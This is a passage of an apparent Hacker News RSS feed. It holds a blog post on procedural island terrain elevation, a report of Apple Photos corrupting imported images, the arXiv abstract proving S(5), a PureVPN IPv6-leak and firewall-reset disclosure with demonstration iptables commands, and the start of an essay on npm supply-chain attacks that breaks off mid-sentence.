<div id="readability-page-1" class="page"><div aria-label="Content">
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <figure>
  <img src="https://brashandplucky.com/uploads/2025/procedural-island-generation-iii/chemaguerra-terrain-elevation-detailed.png" alt="Terrain elevation with noise layers">
  <figcaption>Resulting terrain elevation with multi-scale noise layers and mountain peaks</figcaption>
</figure>

<p>This post continues from <a href="https://brashandplucky.com/2025/09/10/procedural-island-generation-ii.html">Part II</a>, where we established the paint map foundation and mountain ridge system. Now we’ll add detailed noise layers, distance-based mountain peaks, and do blending to create the final terrain elevation.</p>

<h2 id="paint-map-recap">Paint Map (recap)</h2>

<p>Before applying noise layers, we start with the foundation established in Part I - the paint map that defines our base land/water distribution:</p>

<figure>
  <img src="https://brashandplucky.com/uploads/2025/procedural-island-generation-iii/chemaguerra-paint-map-part-i.png" alt="Paint map from Part I">
  <figcaption>The paint map from Part I - our starting elevation values before noise enhancement</figcaption>
</figure>

<p>For visualization throughout this series, we’ll be using the magma palette from matplotlib, which I patched to artificially darken the ocean areas to highlight the coastline:</p>

<figure>
  <img src="https://brashandplucky.com/uploads/2025/procedural-island-generation-iii/chemaguerra-paint-map-triangulated.png" alt="Paint map sampled at triangle centroids">
  <figcaption>Paint map values sampled at the centroids of Delaunay triangles</figcaption>
</figure>

<p>Note that we’ll be sampling the paint map <em>per Delaunay triangle</em> (at each triangle’s centroid):</p>

<figure>
  <img src="https://brashandplucky.com/uploads/2025/procedural-island-generation-iii/chemaguerra-paint-map-triangulated-center.png" alt="Central portion of triangulated paint map">
  <figcaption>Central portion of the above image showing the per-triangle sampling more clearly</figcaption>
</figure>

<p>Remember that the paint map provides the broad strokes: positive values for land, negative for ocean, with smooth transitions between them. Now we’ll enhance it with noise layers to create realistic terrain detail.</p>

<h2 id="multi-scale-noise-layers">Multi-Scale Noise Layers</h2>

<p>We will layer multiple octaves of Simplex noise at different frequencies over the broad strokes provided by the paint map. Each will contribute different detail scales to the final terrain.</p>

<p><a href="https://github.com/redblobgames/mapgen4">mapgen4</a> by <a href="https://x.com/redblobgames">@redblobgames</a> in particular uses six layers:</p>

<figure>
  <img src="https://brashandplucky.com/uploads/2025/procedural-island-generation-iii/chemaguerra-noise-fields-combined.png" alt="Noise field visualization">
  <figcaption>All six noise fields at different frequencies (1x, 2x, 4x, 16x, 32x, 64x) shown in a 3x2 grid</figcaption>
</figure>

<figure>
  <img src="https://brashandplucky.com/uploads/2025/procedural-island-generation-iii/chemaguerra-noise-triangulated.png" alt="Triangulated noise field">
  <figcaption>Top-left corner of noise2 - Note that we are sampling the noises at the (centroids of the) triangles.</figcaption>
</figure>

<table>
  <thead>
    <tr>
      <th>Layer</th>
      <th>Frequency</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>n₀</td>
      <td>1x</td>
      <td>Lowest frequency</td>
    </tr>
    <tr>
      <td>n₁</td>
      <td>2x</td>
      <td>Low frequency</td>
    </tr>
    <tr>
      <td>n₂</td>
      <td>4x</td>
      <td>Medium-low frequency</td>
    </tr>
    <tr>
      <td>n₄</td>
      <td>16x</td>
      <td>Medium-high frequency</td>
    </tr>
    <tr>
      <td>n₅</td>
      <td>32x</td>
      <td>High frequency</td>
    </tr>
    <tr>
      <td>n₆</td>
      <td>64x</td>
      <td>Highest frequency</td>
    </tr>
  </tbody>
</table>

<p>Notice the gap in numbering (n₃ is missing). This would correspond to frequency 8x, which we don’t use.</p>

<h3 id="coastal-noise-enhancement">Coastal Noise Enhancement</h3>

<p>mapgen4 starts with coastal noise enhancement. This provides control over the variation at coastlines while keeping inland elevation unaffected:</p><p>

\[e = \text{Paint map from Part I}\]

\[e_{coast} = e + \alpha \cdot (1 - e^4) \cdot \left(n_4 + \frac{n_5}{2} + \frac{n_6}{4}\right)\]

</p><p>The term \((1 - e^4)\) creates a bell curve that peaks at \(e=0\) (coastline) and decreases rapidly for \(\lvert e \rvert &gt; 0\). This modulates an fBm-like combination of our three highest frequency noise layers.</p>

<p>What matters here isn’t the exact formula or amplitudes, but the core principle: applying high-frequency detail specifically where land meets water.</p><p>

\[e_{tmp} = \begin{cases}
e &amp; \text{if } e_{coast} &gt; 0 \\
e_{coast} &amp; \text{if } e_{coast} \leq 0
\end{cases}\]

</p><figure>
  <video controls="" loop="" muted="" playsinline="">
    <source src="https://brashandplucky.com/uploads/2025/procedural-island-generation-iii/chemaguerra-noisy-coastlines-variation.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>
  <figcaption>e<sub>tmp</sub> with varying α - Showing its effect on coastline and seabed complexity</figcaption>
</figure>

<h2 id="mountain-distance-field">Mountain Distance Field</h2>

<p>Mountains need special pre-processing. If you remember from <a href="https://brashandplucky.com/2025/09/07/procedural-island-generation-i.html">Part I</a> in the swarm of seed points we tagged some as mountain peaks. Here we will pre-compute a <em>distance field</em> from every regular seed point to the closest mountain peak point.</p>

<p>We compute distance through the mesh topology of the Delaunay triangulation using BFS (breadth-first search). <em>i.e.,</em> we don’t use Euclidean distance. This creates more organic mountain shapes that follow the terrain’s natural connectivity.</p>

<p>The algorithm spreads outward from mountain peaks:</p>
<ol>
  <li>Start at triangles containing mountain seed points (distance = 0)</li>
  <li>Visit neighboring triangles, incrementing distance by a randomized amount</li>
  <li>The randomization creates natural ridge patterns instead of perfect cones</li>
</ol>

<p>Here’s the magic formula used for distance increment in each step:</p><p>

\[\Delta = s \cdot (1 + j \cdot r)\]

</p><p>Where:</p>
<ul>
  <li>\(s\) = spacing between triangles (uses configured Poisson disk separation)</li>
  <li>\(j\) = jaggedness parameter (0 = true topological distance, 1 = very irregular)</li>
  <li>\(r \in [-1,1]\) = random factor using triangular distribution</li>
</ul>

<p>The triangular distribution <code>rand() - rand()</code> clusters values near zero while allowing occasional larger variations. This looks more natural than uniform randomness.</p>

<p>I implemented <a href="https://en.wikipedia.org/wiki/Fisher%E2%80%93Yates_shuffle">Fisher-Yates shuffling</a> when visiting neighbor triangles. Instead of processing neighbors in a fixed order (which would create directional bias), the order is randomly shuffled each time. This ensures mountain ridges branch out organically in all directions rather than following predictable patterns.</p>

<p>After computing distances this way, we normalize them (by the max dist, for example):</p>

<figure>
  <video controls="" loop="" muted="" playsinline="">
    <source src="https://brashandplucky.com/uploads/2025/procedural-island-generation-iii/chemaguerra-mountain-distance-field-jaggedness.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>
  <figcaption>d<sub>m</sub> - Normalized mountain distance field with varying jaggedness parameter</figcaption>
</figure>

<h2 id="elevation-blending">Elevation Blending</h2>

<p>The final elevation combines all components through weighted blending:</p><p>

\[e_{final} = \begin{cases}
\text{lerp}(e_{coast}^2, e_{hill}, e_{mountain}) &amp; \text{if } e_{coast} &gt; 0 \\
e_{coast} \cdot (\rho + n_1) &amp; \text{if } e_{coast} \leq 0
\end{cases}\]

</p><p>Where:</p>

<ul>
  <li>\(e_{hill} = h \cdot (1 + \text{lerp}(\frac{1 + n_0}{2}, n_4, n_2))\) =&gt; hill elevation with noise-modulated height</li>
  <li>\(e_{mountain} = 1 - \frac{\mu}{2^\sigma} \cdot d_m\) =&gt; mountain elevation from distance field</li>
</ul>

<p>The quadratic blend weight produces smooth transitions from hills near the coast through mixed terrain at mid-elevations to pure mountains at peaks.</p>

<p>With (editable) parameters:</p>

<ul>
  <li>\(\alpha\): Coastal noise strength (0.01)</li>
  <li>\(h\): Hill height scale (0.02)</li>
  <li>\(\rho\): Ocean depth multiplier (1.5)</li>
  <li>\(\mu\): Mountain slope (17.6)</li>
  <li>\(\sigma\): Mountain sharpness (9.8)</li>
</ul>

<h3 id="interactive-parameter-exploration">Interactive Parameter Exploration</h3>

<figure>
  <video controls="" loop="" muted="" playsinline="">
    <source src="https://brashandplucky.com/uploads/2025/procedural-island-generation-iii/chemaguerra-mountain-sharpness-variation.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>
  <figcaption>Terrain elevation with varying mountain sharpness σ</figcaption>
</figure>

<figure>
  <video controls="" loop="" muted="" playsinline="">
    <source src="https://brashandplucky.com/uploads/2025/procedural-island-generation-iii/chemaguerra-mountain-jaggedness-elevation.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>
  <figcaption>Terrain elevation with varying mountain jaggedness j</figcaption>
</figure>

<figure>
  <video controls="" loop="" muted="" playsinline="">
    <source src="https://brashandplucky.com/uploads/2025/procedural-island-generation-iii/chemaguerra-hill-height-variation.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>
  <figcaption>Terrain elevation with varying hill height scale h</figcaption>
</figure>

<figure>
  <video controls="" loop="" muted="" playsinline="">
    <source src="https://brashandplucky.com/uploads/2025/procedural-island-generation-iii/chemaguerra-ocean-depth-variation.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>
  <figcaption>Terrain elevation with varying ocean depth multiplier ρ</figcaption>
</figure>

<h2 id="region-vs-triangle-elevation">Region (vs. Triangle) Elevation</h2>

<p>So far we’ve computed elevation for triangles. But our Voronoi regions (from Part I) also need elevations for certain stages in the rest of the series.</p>

<figure>
  <img src="https://brashandplucky.com/uploads/2025/procedural-island-generation-iii/chemaguerra-triangle-region-full-animation.gif" alt="Triangle vs Region elevation animation">
  <figcaption>Animation comparing triangle elevation vs region elevation (1 second each)</figcaption>
</figure>

<p>Each seed point defines a Voronoi region and serves as a vertex in multiple Delaunay triangles. To assign elevation to a Voronoi region, we average the elevations of all triangles that share its seed point as a vertex.</p>

<figure>
  <img src="https://brashandplucky.com/uploads/2025/procedural-island-generation-iii/chemaguerra-triangle-region-animation.gif" alt="Triangle vs Region elevation animation">
  <figcaption>Central detail animating between triangle elevation and region elevation (1 second each)</figcaption>
</figure>

<h2 id="next-steps">Next Steps</h2>

<p>With elevation complete, our island has shape but lacks the defining features carved by water. Part IV will simulate the hydrological cycle: rainfall patterns influenced by topography, rivers flowing from peaks to ocean, and valleys carved by erosion.</p>

<h2 id="valuable-resources">Valuable Resources</h2>

<ul>
  <li><a href="https://www.redblobgames.com/maps/terrain-from-noise/">Terrain from Noise</a> - Amit Patel’s Red Blob Games guide to layering noise for terrain</li>
  <li><a href="https://www.redblobgames.com/x/1843-planet-generation/">Polygonal Map Generation</a> - Red Blob Games on Voronoi-based terrain (mapgen4 inspiration)</li>
  <li><a href="https://www.redblobgames.com/x/1723-procedural-river-growing/">Distance Fields for Terrain</a> - Red Blob Games on using distance fields in terrain generation</li>
</ul>

  </div>
</article>

      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Apple Photos App Corrupts Images (950 pts)]]></title>
            <link>https://tenderlovemaking.com/2025/09/17/apple-photos-app-corrupts-images/</link>
            <guid>45274277</guid>
            <pubDate>Wed, 17 Sep 2025 11:07:44 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://tenderlovemaking.com/2025/09/17/apple-photos-app-corrupts-images/">https://tenderlovemaking.com/2025/09/17/apple-photos-app-corrupts-images/</a>, See on <a href="https://news.ycombinator.com/item?id=45274277">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
      <p>The Apple Photos app sometimes corrupts images when importing from my camera.
I just wanted to make a blog post about it in case anyone else runs into the problem.
I’ve seen other references to this online, but most of the people gave up trying to fix it, and none of them went as far as I did to debug the issue.</p>
<p>I’ll try to describe the problem, and the things I’ve tried to do to fix it.
But also note that I’ve (sort of) given up on the Photos app too.
Since I can’t trust it to import photos from my camera, I switched to a different workflow.</p>
<p>Here is a screenshot of a corrupted image in the Photos app:</p>
<p><img src="https://tenderlovemaking.com/images/corrupt-image.png" alt="screenshot of a corrupt image"></p>
<h2 id="how-i-used-to-import-images">How I used to import images</h2>
<p>I’ve got an <a href="https://en.wikipedia.org/wiki/OM_System_OM-1">OM System OM-1</a> camera.
I used to shoot in RAW + jpg, then when I would import to Photos app, I would check the “delete photos after import” checkbox in order to empty the SD card.
Turns out “delete after import” was a huge mistake.</p>
<h2 id="getting-corrupted-images">Getting corrupted images</h2>
<p>I’m pretty sure I’d been getting corrupted images for a while, but it would only be 1 or 2 images out of thousands, so I thought nothing of it (it was probably my fault anyway, right?)</p>
<p>But the problem really got me upset when last year I went to a family member’s wedding and took tons of photos.
Apple Photos combines RAW + jpg photos so you don’t have a bunch of duplicates, and when you view the images in the photos app, it just shows you the jpg version by default.
After I imported all of the wedding photos I noticed some of them were corrupted.
Upon closer inspection, I found that it sometimes had corrupted the jpg, sometimes corrupted the RAW file, and sometimes both.
Since I had been checking the “delete after import” box, I didn’t know if the images on the SD card were corrupted <em>before</em> importing or not.
After all, the files had been deleted so there was no way to check.</p>
<p>I estimate I completely lost about 30% of the images I took that day.</p>
<p>Losing so many photos really rattled me, but I wanted to figure out the problem so I didn’t lose images in the future.</p>
<h2 id="narrowing-down-the-problem">Narrowing down the problem</h2>
<p>I was worried this was somehow a hardware problem.
Copying files seems so basic, I didn’t think there was any way a massively deployed app like Photos could fuck it up (especially since its main job is managing photo files).
So, to narrow down the issue I changed out all of the hardware.
Here are all the things I did:</p>
<ul>
<li>Switched USB-C cables</li>
<li>Bought a new SD card direct from the manufacturer (to eliminate the possibility of buying a bootleg SD card)</li>
<li>Switched to only shooting in RAW (if importing messes up 30% of my images, but I cut the number of images I import by half, then that should be fewer corrupted images right? lol)</li>
<li>Bought a new laptop</li>
<li>Bought a new camera: the OM System OM-1 MKii</li>
</ul>
<p>I did each of these steps over time, as to only change one variable at a time, and still the image corruption persisted.
I didn’t really want to buy a new camera, the MKii is not really a big improvement over the OM-1, but we had a family trip coming up and the idea that pressing the shutter button on the camera might not actually record the image didn’t sit well with me.</p>
<h2 id="finally-a-smoking-gun">Finally a smoking gun</h2>
<p>Since I had replaced literally all of the hardware involved, I knew it must be a software problem.
I stopped checking the “delete after import” button, and started reviewing all of the photos after import.
After verifying none of them were corrupt, then I would format the SD card.
I did this for months without finding any corrupt files.
At this point I figured it was somehow a race condition or something when copying the photo files and deleting them at the same time.</p>
<p>However, after I got home from RailsConf and imported my photos, I found one corrupt image (the one above).
I was able to verify that the image was <em>not</em> corrupt on the SD card, so the camera was working fine (meaning I probably didn’t need to buy a new camera body at all).</p>
<p>I tried deleting the corrupt file and re-importing the original to see if it was something about that particular image, but it re-imported just fine.
In other words, it seems like the Photos app will corrupt files randomly.</p>
<p>I don’t know if this is a problem that is specific to OM System cameras, and I’m not particularly interested in investing in a new camera system just to find out.</p>
<p>If I compare the corrupted image with the non-corrupted image, the file sizes are exactly the same, but the bytes are different:</p>
<p>Checksums:</p>
<pre tabindex="0"><code>aaron@tc ~/Downloads&gt; md5sum P7110136-from-camera.ORF Exports/P7110136.ORF 
17ce895fd809a43bad1fe8832c811848  P7110136-from-camera.ORF
828a33005f6b71aea16d9c2f2991a997  Exports/P7110136.ORF
</code></pre><p>File sizes:</p>
<pre tabindex="0"><code>aaron@tc ~/Downloads&gt; ls -al P7110136-from-camera.ORF Exports/P7110136.ORF
-rw-------@ 1 aaron  staff  18673943 Jul 12 04:38 Exports/P7110136.ORF
-rwx------  1 aaron  staff  18673943 Jul 17 09:29 P7110136-from-camera.ORF*
</code></pre><p>The <code>P7110136-from-camera.ORF</code> is the non-corrupted file, and <code>Exports/P7110136.ORF</code> is the corrupted file from Photos app.
Here’s a screenshot of the preview of the non-corrupted photo:</p>
<p><img src="https://tenderlovemaking.com/images/non-corrupt.png" alt="screenshot of non-corrupt image"></p>
<p><a href="https://gist.github.com/tenderlove/25853f50ab46a58738ff2cc22d682f2b">Here is the binary diff between the files</a>.
I ran both files through <code>xxd</code> then diffed them.</p>
<h2 id="my-new-workflow">My new workflow</h2>
<p>I’m not going to put any more effort into debugging this problem, but I wanted to blog about it in case anyone else is seeing the issue.
I take a lot of photos, and to be frank, most of them are not very good.
I don’t want to look through a bunch of bad photos every time I look at my library, so culling photos is important.
Culling photos in the Photos app is way too cumbersome, so I’ve switched to using <a href="https://www.darktable.org/">Darktable</a>.</p>
<p>My current process is:</p>
<ul>
<li>Import images to Darktable</li>
<li>Delete the ones I don’t like</li>
<li>Process ones I do like</li>
<li>Export both the jpg and the original raw file</li>
<li>Import those to the Photos app so they’re easy to view and share</li>
<li>Periodically format my SD card</li>
</ul>
<p>I’ve not seen any file corruption when importing to Darktable, so I am convinced this is a problem with the Photos app.
But now, since all of my images land in Darktable before making their way to the Photos app, I don’t really care anymore.
The bad news is that I’ve spent a lot of time and money trying to debug this.
I guess the good news is that now I have redundant hardware!</p>

    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Determination of the fifth Busy Beaver value (237 pts)]]></title>
            <link>https://arxiv.org/abs/2509.12337</link>
            <guid>45273999</guid>
            <pubDate>Wed, 17 Sep 2025 10:26:18 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arxiv.org/abs/2509.12337">https://arxiv.org/abs/2509.12337</a>, See on <a href="https://news.ycombinator.com/item?id=45273999">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content-inner">
    
    
    <div><p><span>Authors:</span>The <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=bbchallenge+Collaboration" rel="nofollow">bbchallenge Collaboration</a>: <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=Blanchard,+J" rel="nofollow">Justin Blanchard</a>, <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=Briggs,+D" rel="nofollow">Daniel Briggs</a>, <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=Deka,+K" rel="nofollow">Konrad Deka</a>, <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=Fenner,+N" rel="nofollow">Nathan Fenner</a>, <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=Forster,+Y" rel="nofollow">Yannick Forster</a>, <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=Georgiev,+G" rel="nofollow">Georgi Georgiev</a> (Skelet), <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=House,+M+L" rel="nofollow">Matthew L. House</a>, <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=Hunter,+R" rel="nofollow">Rachel Hunter</a>, <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=Iijil" rel="nofollow">Iijil</a>, <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=K%C4%85dzio%C5%82ka,+M" rel="nofollow">Maja Kądziołka</a>, <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=Kropitz,+P" rel="nofollow">Pavel Kropitz</a>, <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=Ligocki,+S" rel="nofollow">Shawn Ligocki</a>, <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=mxdys" rel="nofollow">mxdys</a>, <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=Na%C5%9Bciszewski,+M" rel="nofollow">Mateusz Naściszewski</a>, <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=savask" rel="nofollow">savask</a>, <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=St%C3%A9rin,+T" rel="nofollow">Tristan Stérin</a>, <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=Xu,+C" rel="nofollow">Chris Xu</a>, <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=Yuen,+J" rel="nofollow">Jason Yuen</a>, <a href="https://arxiv.org/search/cs?searchtype=author&amp;query=Zimmermann,+T" rel="nofollow">Théo Zimmermann</a></p></div>            
    <p><a href="https://arxiv.org/pdf/2509.12337">View PDF</a>
    <a href="https://arxiv.org/html/2509.12337v1">HTML (experimental)</a></p><blockquote>
            <span>Abstract:</span>We prove that $S(5) = 47,176,870$ using the Coq proof assistant. The Busy Beaver value $S(n)$ is the maximum number of steps that an $n$-state 2-symbol Turing machine can perform from the all-zero tape before halting, and $S$ was historically introduced by Tibor Radó in 1962 as one of the simplest examples of an uncomputable function. The proof enumerates $181,385,789$ Turing machines with 5 states and, for each machine, decides whether it halts or not. Our result marks the first determination of a new Busy Beaver value in over 40 years and the first Busy Beaver value ever to be formally verified, attesting to the effectiveness of massively collaborative online research (bbchallenge$.$org).
    </blockquote>

    <!--CONTEXT-->
    
  </div><div>
      <h2>Submission history</h2><p> From: Tristan Stérin [<a href="https://arxiv.org/show-email/f02cef48/2509.12337" rel="nofollow">view email</a>]      <br>    <strong>[v1]</strong>
        Mon, 15 Sep 2025 18:05:08 UTC (546 KB)<br>
</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[PureVPN IPv6 Leak (161 pts)]]></title>
            <link>https://anagogistis.com/posts/purevpn-ipv6-leak/</link>
            <guid>45273897</guid>
            <pubDate>Wed, 17 Sep 2025 10:10:14 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://anagogistis.com/posts/purevpn-ipv6-leak/">https://anagogistis.com/posts/purevpn-ipv6-leak/</a>, See on <a href="https://news.ycombinator.com/item?id=45273897">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>
            
            
            <div>
                <p>In late August 2025, I submitted two security reports to PureVPN under their VDP. Three weeks later, I’ve received no response, so I decided to publish the findings to inform other users.</p>
<p>The issues affect both their GUI (v2.10.0) and CLI (v2.0.1) clients on Linux (tested on Ubuntu 24.04.3 LTS, kernel 6.8.0, iptables-nft backend). Here’s what I found.</p>
<h2 id="1-ipv6-leaks-off-tunnel">1. IPv6 Leaks Off-Tunnel</h2>
<p>After toggling Wi-Fi or resuming from suspend, the PureVPN client fails to restore IPv6 protections:</p>
<ul>
<li>
<p><strong>CLI (IKS enabled)</strong>: The client auto-reconnects and reports status as “connected”, yet the system regains a default IPv6 route via Router Advertisements (<code>fe80::1</code>). Since <code>ip6tables</code> <code>OUTPUT</code> remains <code>ACCEPT</code> (default), egress resumes off-tunnel.
</p><p>
      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/HDqoD2SaCKA?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" title="YouTube video"></iframe>
    </p>

</li>
<li>
<p><strong>GUI (IKS enabled)</strong>: When the GUI detects a disconnection, it blocks IPv4 and displays the “VPN session disconnected” dialog. However, IPv6 remains functional until the user explicitly clicks <code>Reconnect</code>.
</p><p>
      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/jjCsTt4y2JM?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" title="YouTube video"></iframe>
    </p>

</li>
</ul>
<p>Real-world effect: I was able to browse IPv6-preferred sites and send/receive email (Thunderbird) with my ISP’s IPv6 address while the client UI claimed I was protected.</p>
<h2 id="2-host-firewall-reset-and-not-restored">2. Host Firewall Reset and Not Restored</h2>
<p>At connect time, PureVPN wipes the user’s <code>iptables</code> configuration:</p>
<ul>
<li><code>INPUT</code> is set to <code>ACCEPT</code></li>
<li>All <code>-A</code> rules are flushed (UFW, Docker jumps, user rules, etc.)</li>
<li>After disconnect, these changes are not reverted</li>
</ul>
<p>Result: the system remains more exposed after using the VPN than before. This defeats the point of using UFW or a local deny policy and contradicts user expectations.</p>
<p>Example:</p>
<div><pre tabindex="0"><code data-lang="bash"><span><span><span># Baseline protections</span>
</span></span><span><span>$ sudo iptables -P INPUT DROP
</span></span><span><span>$ sudo iptables -I INPUT -p icmp -j DROP
</span></span><span><span>
</span></span><span><span><span># Connect to VPN</span>
</span></span><span><span>$ purevpn-cli -c US
</span></span><span><span>$ sudo iptables -S <span>|</span> head -3
</span></span><span><span>-P INPUT ACCEPT
</span></span><span><span>-P FORWARD DROP
</span></span><span><span>-P OUTPUT ACCEPT
</span></span><span><span>$ sudo iptables -S <span>|</span> grep icmp
</span></span><span><span><span># (no output — rule was wiped)</span>
</span></span><span><span>
</span></span><span><span><span># Disconnect</span>
</span></span><span><span>$ purevpn-cli -d
</span></span><span><span>$ sudo iptables -S <span>|</span> head -3
</span></span><span><span>-P INPUT ACCEPT
</span></span><span><span>-P FORWARD DROP
</span></span><span><span>-P OUTPUT ACCEPT
</span></span><span><span><span># All wiped. INPUT = ACCEPT</span>
</span></span></code></pre></div><h2 id="tldr">TL;DR</h2>
<p>PureVPN:</p>
<ul>
<li>Does not properly implement an IPv6 kill-switch</li>
<li>Leaves IPv6 egress open after reconnects or IKS events</li>
<li>Wipes your firewall state (<code>iptables</code>) and does not restore it</li>
<li>Applies broad <code>ACCEPT</code> policies to make things work</li>
</ul>
<p>Both issues have real-world impact. Privacy claims are undermined when your real IPv6 leaks and your firewall state is lost.</p>
<p>I submitted full technical reports and screencasts to <a href="mailto:security@purevpn.com">security@purevpn.com</a>. No acknowledgment to date.</p>
<p>Use with caution.</p>

            </div>
        </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[EU Chat Control: Germany's position has been reverted to UNDECIDED (378 pts)]]></title>
            <link>https://mastodon.social/@chatcontrol/115215006562371435</link>
            <guid>45273854</guid>
            <pubDate>Wed, 17 Sep 2025 10:02:55 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://mastodon.social/@chatcontrol/115215006562371435">https://mastodon.social/@chatcontrol/115215006562371435</a>, See on <a href="https://news.ycombinator.com/item?id=45273854">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Oh no, not again a meditation on NPM supply chain attacks (164 pts)]]></title>
            <link>https://tane.dev/2025/09/oh-no-not-again...-a-meditation-on-npm-supply-chain-attacks/</link>
            <guid>45273824</guid>
            <pubDate>Wed, 17 Sep 2025 09:57:50 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://tane.dev/2025/09/oh-no-not-again...-a-meditation-on-npm-supply-chain-attacks/">https://tane.dev/2025/09/oh-no-not-again...-a-meditation-on-npm-supply-chain-attacks/</a>, See on <a href="https://news.ycombinator.com/item?id=45273824">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>I’ve been sitting on this article for a while now – well over a year I’ve put off publishing it – but as we’ve seen this week, the time has come to lift the veil and say the quiet part out loud:</p><blockquote><p><strong>It’s 2025; Microsoft should be considered a “bad actor” and a threat to all companies who develop software.</strong></p></blockquote><p>Of course, if you’re old enough to remember – this is not the first time either…</p><h3 id="time-is-a-flat-circle">Time is a flat circle</h3><p>Here we are again – in 2025, <strong>Microsoft</strong> have fucked up so bad, they have likely created an even larger risk than they did in the 2000’s with their browser by simply doing absolutly nothing.</p><p>I had started initially writing this post around the time of the <a href="https://en.wikipedia.org/wiki/XZ_Utils_backdoor" target="_blank">xz incident</a>
– a sophisticated and long-term attempt to gain control of a library used in many package managers of most Linux distributions.</p><p>Since then, many more incidents have happened, and to be specific <strong>NPM</strong> has become the largest and <em>easiest</em> way to ship malware. At first, most of it was aimed at stealing cryptocurrency (because techbros seem to be obsessed with magic electic money and are easy prey). But now, these supply chain attacks are starting to target more critical things like tokens and access keys of the package maintainers, as seen with the <a href="https://snyk.io/blog/weaponizing-ai-coding-agents-for-malware-in-the-nx-malicious-package/" target="_blank">NX</a>
incident and now <a href="https://www.aikido.dev/blog/npm-debug-and-chalk-packages-compromised" target="_blank">several depedencies that are used daily by thousands of developers</a>
.</p><p>Again… this is <a href="https://en.wikipedia.org/wiki/Npm_left-pad_incident" target="_blank">nothing new</a>
in the land of NPM.</p><p>But it didn’t have to be this way…</p><h3 id="weve-come-along-way-but-have-travelled-nowhere">We’ve come along way, but have travelled nowhere</h3><p>I have a long history with NodeJS – around 2010 I started working on a startup, and this was <a href="https://www.slideshare.net/slideshow/techmeetup-edinburgh-nodejs-talk/5742191" target="_blank">before npm was even a thing</a>
.</p><p><img src="https://tane.dev/images/npm-before-it-was-a-thing.png" alt="A sceenshot of a slide with an announcement of npm as a package manage for node"></p><p>Back in the misty days of the 1990s most JavaScript security issues were not much of a backend concern: this was mostly the domain of Perl, PHP, Python, and Java.</p><p><em>The web however was a much different story.</em></p><p>In the very early days of the World Wide Web there was really only one main browser everyone used: Netscape Navigator. Released in 1994 it was not <em>just a browser</em>: throughout its life it had various incarnations of a built-in email client, calendar, HTML editor with FTP browser, and with plugins could play media files like Realplayer and MP3 (which I remember at its launch) and Flash movies and games. It’s where JavaScript was born.</p><p>Many of the early websites of the day were static – popular tools to build websites included <a href="https://en.wikipedia.org/wiki/HotDog" target="_blank">HotDog</a>
or <a href="https://en.wikipedia.org/wiki/Windows_Notepad" target="_blank">Notepad</a>
. No fancy IDEs or frameworks, just a text editor, a browser, and <code>alert()</code> to debug.</p><blockquote><p>Microsoft had also entered the game with Internet Explorer – included in an early Windows DLC called “Plus! For Windows 95”. It eventually became the software that Microsoft bet its whole company strategy around (much like today with AI).</p></blockquote><p>Internet Explorer was embedded into every aspect of Windows – first in 1995 with Active Desktop, which continued all the way to Windows XP. With it you could embed a frame item on your Desktop, but also a Rich Text document or Excel spreadsheet. It was also bloated and buggy – and with that it presented two problems: a massive security risk and exposure to accusations of monopolising the browser market.</p><blockquote><p>The law came after Microsoft hard and in 2001 it won – Microsoft was told to break up its monopoly. One aspect was that it had to offer other browsers on its operating system (a similar story happening now to Apple) – but it also wasn’t forced to <strong>remove</strong> Internet Explorer.</p></blockquote><p>Microsoft essentially <em>abandoned</em> IE; as the years rolled on they continued to push out new major verions to capture the market, but without fixing the major flaws. It still shipped as default with the OS, unable to be removed without breaking other parts of the system.</p><p>Each release of Internet Explorer added something new to the browser landscape, but it also continued to add bugs and flaws on top of the ones that no one touched – by default, on all Windows systems lived code that could <a href="https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2014/ms14-012?redirectedfrom=MSDN" target="_blank">give hijackers access to users machines</a>
